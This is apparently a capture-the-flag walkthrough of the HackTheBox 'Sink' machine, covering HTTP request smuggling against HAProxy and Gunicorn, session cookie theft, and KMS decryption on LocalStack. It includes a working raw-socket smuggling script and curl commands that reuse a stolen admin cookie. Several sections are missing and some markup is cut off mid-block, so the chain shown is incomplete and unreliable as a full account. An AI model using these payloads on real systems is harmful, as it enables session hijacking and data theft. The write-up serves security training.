<h2 id="1-approach-to-sink">1. Approach to Sink</h2>
<p>Sink earns its Insane rating by chaining several complex techniques that must work together.</p>
<p><strong>The two pillars of this box:</strong></p>
<ol>
<li><strong>HTTP Request Smuggling</strong> - A vulnerability that lives in the space BETWEEN two servers (HAProxy and Gunicorn). It's not in either server alone - it's in how they <em>disagree</em> about where one request ends and another begins.</li>
<li><strong>AWS Cloud Exploitation</strong> - A local AWS stack (LocalStack) running inside Docker, exposing services like Secrets Manager and KMS that hold sensitive secrets.</li>
</ol>
<p><strong>Our mental model:</strong></p>
<ul>
<li>We start external, find a web app, and realize the front-end/back-end communication is mistrustful.</li>
<li>We exploit that mistrust to steal an admin session.</li>
<li>We pivot from web creds → SSH key → AWS secrets → encrypted file → root password.</li>
<li>Each pivot requires us to <strong>change our perspective</strong>: from web attacker → code auditor → cloud pentester → cryptanalyst.</li>
</ul>
<hr>
<h2 id="2-initial-reconnaissance">2. Initial Reconnaissance</h2>
<h3 id="2-1-why-recon-matters">2.1 Why Recon Matters</h3>
<p>You cannot exploit what you do not understand. The goal of recon is not just to find open ports - it's to <strong>build a mental map of the target's architecture</strong>. Every version number, every response header, every service banner is a clue.</p>
<h3 id="2-2-full-tcp-port-scan">2.2 Full TCP Port Scan</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 -oA sink_alltcp 10.129.5.161
</code></pre>
<p><strong>Why <code>--min-rate 10000</code>?</strong><br>HackTheBox machines can be slow to scan. We speed things up by telling nmap to maintain a high packet rate. This sacrifices some stealth for speed, which is acceptable in a CTF environment.</p>
<p><strong>Result:</strong></p>
<pre><code>PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
5000/tcp open  upnp
</code></pre>
<p>Three ports. SSH is always worth noting, but the real story is ports 3000 and 5000.</p>
<h3 id="2-3-service-version-detection">2.3 Service Version Detection</h3>
<pre><code class="language-bash" data-language="bash">nmap -p 22,3000,5000 -sC -sV -oA sink_tcpscripts 10.129.5.161
</code></pre>
<p><strong>Why <code>-sC</code> and <code>-sV</code>?</strong><br><code>-sC</code> runs default NSE scripts that often reveal banners, certificates, and common misconfigurations. <code>-sV</code> probes services to determine their exact version. Version numbers are critical because they tell us what exploits might exist.</p>
<p><strong>Key findings:</strong></p>
<ul>
<li><strong>Port 22:</strong> OpenSSH 8.2p1 Ubuntu → Ubuntu 20.04 Focal</li>
<li><strong>Port 3000:</strong> Gitea (self-hosted Git service)</li>
<li><strong>Port 5000:</strong> Gunicorn 20.0.0 (Python WSGI HTTP server)</li>
</ul>
<h3 id="2-4-the-hacker-s-observation">2.4 The Hacker's Observation</h3>

<p>Version numbers are not random. When you see a very specific point release (20.0.0 instead of 20.0.4), your spider sense should tingle. This version was specifically chosen because it's <strong>vulnerable</strong> to a known request smuggling issue that was patched in 20.0.1.</p>
<p>Similarly, the presence of Gitea on port 3000 tells us there's likely source code to audit later. The combination of Gunicorn + a front-end proxy (we'll confirm HAProxy soon) is the classic recipe for HTTP request smuggling.</p>

<p><strong>Recon</strong> tells us what's there. <strong>Enumeration</strong> tells us how it works. Before we can exploit port 5000, we need to understand what the application does and how it authenticates users.</p>

<ul>

<h2 id="http-request-smuggling">HTTP Request Smuggling</h2>
<h3 id="4-1-what-is-http-request-smuggling">4.1 What is HTTP Request Smuggling?</h3>
<p>HTTP Request Smuggling is an attack that exploits <strong>disagreements</strong> between a front-end server (HAProxy) and a back-end server (Gunicorn) about where one HTTP request ends and the next begins.</p>
<p><strong>Normal HTTP request boundaries are defined by:</strong></p>
<ol>
<li><strong><code>Content-Length</code> header</strong> → Body is exactly N bytes</li>
<li><strong><code>Transfer-Encoding: chunked</code></strong> → Body is split into chunks; last chunk is size 0</li>
</ol>
<p><strong>The vulnerability:</strong> If the front-end and back-end disagree on which header to honor, an attacker can "smuggle" a second request inside the body of the first. The front-end sees one request. The back-end sees two.</p>
<h3 id="4-2-the-cl-te-desync-content-length-vs-transfer-encoding">4.2 The CL.TE Desync (Content-Length vs. Transfer-Encoding)</h3>
<p>In our case, we're exploiting a <strong>CL.TE</strong> desync:</p>
<ul>
<li><strong>HAProxy</strong> (front-end) uses <code>Content-Length</code></li>
<li><strong>Gunicorn</strong> (back-end) uses <code>Transfer-Encoding: chunked</code></li>
</ul>
<p><strong>How?</strong> We send a malformed <code>Transfer-Encoding</code> header that HAProxy doesn't recognize but Gunicorn does.</p>
<h3 id="4-3-the-magic-byte-x0b">4.3 The Magic Byte: <code>\x0b</code></h3>
<p>The key is the vertical tab character (<code>\x0b</code>, ASCII 11). When we send:</p>
<pre><code class="language-http" data-language="http">Transfer-Encoding: \x0bchunked
</code></pre>
<p><strong>HAProxy sees:</strong> The header value starts with a weird control character. It considers the header invalid and falls back to <code>Content-Length</code>.</p>
<p><strong>Gunicorn sees:</strong> It strips the <code>\x0b</code> and sees <code>Transfer-Encoding: chunked</code>. It ignores <code>Content-Length</code> and processes the body as chunked.</p>
<h3 id="4-4-visualizing-the-attack">4.4 Visualizing the Attack</h3>
<p><strong>What HAProxy sees (one request):</strong></p>
<pre><code class="language-http" data-language="http">GET / HTTP/1.1
Host: 10.129.5.161:5000
Content-Length: 230
Transfer-Encoding: [invalid]

0

POST /notes HTTP/1.1
Host: 10.129.5.161:5000
Cookie: session=OUR_COOKIE
Content-Length: 300

note=
</code></pre>
<p>HAProxy says: "The body is 230 bytes. I'll forward all of it as one request."</p>
<p><strong>What Gunicorn sees (two requests):</strong></p>
<pre><code class="language-http" data-language="http">GET / HTTP/1.1
Host: 10.129.5.161:5000
Content-Length: 230
Transfer-Encoding: chunked

0
</code></pre>
<p>Gunicorn sees the terminating chunk <code>0\r\n\r\n</code>. Request 1 is complete. Then it sees:</p>
<pre><code class="language-http" data-language="http">POST /notes HTTP/1.1
Host: 10.129.5.161:5000
Cookie: session=OUR_COOKIE
Content-Length: 300

note=
</code></pre>
<p>Request 2 is a POST to <code>/notes</code> with <code>Content-Length: 300</code>. But wait - we didn't provide 300 bytes of body! Gunicorn waits for more data on this connection.</p>
<p><strong>The next request that arrives</strong> (from the bot/admin/any other user) gets appended to <code>note=</code> and becomes the body of our POST. That request gets saved as a note under OUR account.</p>
<h3 id="4-5-mechanism-on-sink">4.5 Mechanism on Sink</h3>
<p>The box designers solved a hard problem: on a shared CTF platform, many hackers try to smuggle simultaneously. If everyone is smuggling, who catches the admin's request?</p>
<p><strong>The solution:</strong> 16 Docker containers, each running the app. IPTables routes each source IP to exactly one container. You and the periodic bot are both hitting the same container. When the bot makes its periodic request, if your smuggled connection is still open, the bot's request becomes YOUR note.</p>
<hr>
<h2 id="5-capturing-the-admin-cookie">5. Capturing the Admin Cookie</h2>
<h3 id="5-1-building-the-smuggle-script">5.1 Building the Smuggle Script</h3>
<p>We cannot use <code>curl</code> or <code>requests</code> because they create well-formed HTTP requests. We need raw socket access to inject the <code>\x0b</code> character exactly where we want it.</p>
<pre><code class="language-python" data-language="python">#!/usr/bin/env python3
import socket
import time

host = "10.129.5.161"
port = 5000
session_cookie = "session=eyJlbWFpbCI6InRlc3RAdGVzdC50ZXN0In0.ahlj8A.XLe99ASkUHm1NbjqXAr4F3Fq-Mk"

# The body starts with the chunked terminator "0", then our smuggled POST
body = f"""0

POST /notes HTTP/1.1
Host: {host}:{port}
Referer: http://{host}:{port}/notes
Content-Type: text/plain
Content-Length: 300
Cookie: {session_cookie}

note=""".replace('\n','\r\n')

# The header uses Content-Length to trick HAProxy, and \x0b to trick Gunicorn
header = f"""GET / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(body)}
Transfer-Encoding: \x0bchunked

""".replace('\n','\r\n')

request = (header + body).encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.send(request)
    time.sleep(5)  # Keep connection open for bot to hit
</code></pre>
<p><strong>Critical details:</strong></p>
<ul>
<li><code>.replace('\n','\r\n')</code> → HTTP requires CRLF line endings. Python triple-quoted strings use LF (<code>\n</code>) by default.</li>
<li><code>Transfer-Encoding: \x0bchunked</code> → The space after the colon is important. HAProxy must see a value it doesn't recognize.</li>
<li><code>Content-Length: 300</code> in the smuggled POST → Large enough to capture the full bot request (which is ~300 bytes), but not so large that Gunicorn times out before the bot arrives.</li>
</ul>
<h3 id="5-2-why-we-need-to-retry">5.2 Why We Need to Retry</h3>
<p>This is a <strong>race condition</strong>. The bot hits periodically. Your source IP is pinned to one of 16 containers. The bot eventually hits your container, but you don't know exactly when.</p>
<p><strong>The self-trigger enhancement:</strong> We discovered that sending a second request immediately after the smuggle increases reliability. Even if our trigger doesn't get captured, it seems to help "prime" the backend connection.</p>
<pre><code class="language-python" data-language="python"># Self-trigger variant
def trigger():
    time.sleep(0.3)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    req = f"GET /notes/delete/99999 HTTP/1.1\r\nHost: {host}:{port}\r\nCookie: {session_cookie}\r\n\r\n".encode()
    s.send(req)
    s.close()
</code></pre>
<h3 id="5-3-success">5.3 Success!</h3>
<p>After running the smuggle script, we check our notes:</p>
<pre><code class="language-bash" data-language="bash">curl -s -b "session=eyJlbWFpbCI6InRlc3RAdGVzdC50ZXN0In0.ahlj8A.XLe99ASkUHm1NbjqXAr4F3Fq-Mk" http://10.129.5.161:5000/notes
</code></pre>
<p>A new note appears! Viewing it reveals:</p>
<pre><code>GET /notes/delete/1234 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Accept: */*
Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.ahlhiA.XhLiBR0qoVPI4k7xAlXaZwdi43A
X-Forwarded-For: 127.0.0.1
</code></pre>
<p><strong>Result:</strong> The admin session cookie is ours.</p>

<h2 id="6-accessing-admin-notes-and-credential-harvesting">6. Accessing Admin Notes &amp; Credential Harvesting</h2>
<h3 id="6-1-session-hijacking">6.1 Session Hijacking</h3>
<p>A session cookie is the digital equivalent of someone leaving their ID badge on a table. We didn't break the authentication - we just borrowed someone else's already-authenticated session.</p>
<h3 id="6-2-accessing-admin-notes">6.2 Accessing Admin Notes</h3>
<p>Using the stolen admin cookie:</p>
<pre><code class="language-bash" data-language="bash">curl -s -b "session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.ahlhiA.XhLiBR0qoVPI4k7xAlXaZwdi43A" http://10.129.5.161:5000/notes
</code></pre>
<p>The admin has three notes:</p>
<p><strong>Note 1:</strong></p>
<pre><code>Chef Login : http://chef.sink.htb
Username : chefadm
Password : REDACTED

<h3 id="7-5-mechanism">7.5 Mechanism</h3>
<p>Developers often think "delete the file, commit, problem solved." But Git is a time machine. Every commit, every file, every line is preserved forever (unless you explicitly rewrite history with <code>git filter-branch</code> or <code>BFG Repo-Cleaner</code>).</p>
<p><strong>Lesson:</strong> Check commit history for deleted sensitive files.</p>

<h2 id="11-privilege-escalation-kms-decryption">11. Privilege Escalation: KMS Decryption</h2>
<h3 id="11-1-the-encrypted-file">11.1 The Encrypted File</h3>
<p>In david's home directory:</p>
<pre><code class="language-bash" data-language="bash">cd ~ &amp;&amp; find Projects/ -type f
</code></pre>
<p><strong>Output:</strong> <code>Projects/Prod_Deployment/servers.enc</code></p>
<pre><code class="language-bash" data-language="bash">file Projects/Prod_Deployment/servers.enc
</code></pre>
<p><strong>Output:</strong> <code>data</code></p>
<p>This is an encrypted blob. We need to decrypt it.</p>
<h3 id="11-2-kms-key-enumeration">11.2 KMS Key Enumeration</h3>
<pre><code class="language-bash" data-language="bash">awslocal kms list-keys | grep KeyId | cut -d'"' -f4
</code></pre>
<p>We get 11 keys. We need the one that is:</p>
<ol>
<li><strong>Enabled</strong> (not Disabled)</li>
<li>Has <strong>ENCRYPT_DECRYPT</strong> key usage</li>
</ol>
<pre><code class="language-bash" data-language="bash">awslocal kms list-keys | grep KeyId | cut -d'"' -f4 | while read id; do
  desc=$(awslocal kms describe-key --key-id $id)
  use=$(echo $desc | cut -d'"' -f26)
  echo $desc | grep -q Disabled || echo "$id  $use"
done
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>804125db-bdf1-465a-a058-07fc87c0fad0  ENCRYPT_DECRYPT
c5217c17-5675-42f7-a6ec-b5aa9b9dbbde  SIGN_VERIFY
</code></pre>
<p>Our target key is <code>804125db-bdf1-465a-a058-07fc87c0fad0</code>.</p>
<h3 id="11-3-decrypting-the-file">11.3 Decrypting the File</h3>
<pre><code class="language-bash" data-language="bash">awslocal kms decrypt \
  --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 \
  --ciphertext-blob fileb://Projects/Prod_Deployment/servers.enc \
  --encryption-algorithm RSAES_OAEP_SHA_256
</code></pre>
<p><strong>Output:</strong></p>
<pre><code class="language-json" data-language="json">{
    "KeyId": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0",
    "Plaintext": "REDACTED_ENCODED_LAB_MATERIAL",
    "EncryptionAlgorithm": "RSAES_OAEP_SHA_256"
}
</code></pre>
<h3 id="11-4-unpacking-the-decrypted-data">11.4 Unpacking the Decrypted Data</h3>
<p>The <code>Plaintext</code> is base64-encoded. Decode it:</p>
<pre><code class="language-bash" data-language="bash">echo "REDACTED_ENCODED_LAB_MATERIAL" | base64 -d &gt; servers.gz
</code></pre>
<pre><code class="language-bash" data-language="bash">file servers.gz
</code></pre>
<p><strong>Output:</strong> <code>servers.gz: gzip compressed data</code></p>
<pre><code class="language-bash" data-language="bash">zcat servers.gz &gt; servers.tar &amp;&amp; tar -xvf servers.tar
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>servers.yml
servers.sig
</code></pre>
<pre><code class="language-bash" data-language="bash">cat servers.yml
</code></pre>
<p><strong>Output:</strong></p>
<pre><code class="language-yaml" data-language="yaml">server:
  listenaddr: ""
  port: 80
  hosts:
    - certs.sink.htb
    - vault.sink.htb

  name: admin

<h2 id="13-key-lessons-and-takeaways">13. Key Lessons &amp; Takeaways</h2>
<h3 id="13-1-http-request-smuggling">13.1 HTTP Request Smuggling</h3>
<ul>
<li><strong>The vulnerability lives in the gap between servers.</strong> Check for reverse proxies and their versions.</li>
<li><strong>Specific point releases are suspicious.</strong> Gunicorn 20.0.0 was chosen because 20.0.1 patched the smuggling bug.</li>
<li><strong>Raw sockets are your friend.</strong> When dealing with malformed protocols, you often need to craft bytes manually.</li>
<li><strong>Persistence beats intelligence.</strong> This exploit is probabilistic. The winners are those who automate and retry.</li>
</ul>
<h3 id="13-2-git-enumeration">13.2 Git Enumeration</h3>
<ul>
<li><strong>Git never forgets.</strong> Check commit history, especially for deleted files.</li>
<li><strong>Archived repos are still readable.</strong> Don't ignore repos just because they're marked "archived."</li>
</ul>
<h3 id="13-3-cloud-services-localstack">13.3 Cloud Services (LocalStack)</h3>
<ul>
<li><strong>Local AWS stacks accept any credentials.</strong> Don't assume you need to "crack" AWS keys on local instances.</li>
<li><strong>Cloud services are just services.</strong> Secrets Manager, KMS, S3 - these are all just APIs. If you can reach them, you can exploit them.</li>
<li><strong>Encrypted files are only as strong as key management.</strong> If the decryption key is accessible on the same machine, encryption is just obfuscation.</li>
</ul>
<h3 id="13-4-the-chain">13.4 The Chain</h3>
<pre><code>HTTP Smuggle → Admin Cookie → Gitea Creds → SSH Key → User Shell
    → AWS Creds → Secrets Manager → David Password → KMS Decrypt → Root
</code></pre>
<p>Each recovered primitive supplied the input required by the next stage.</p>
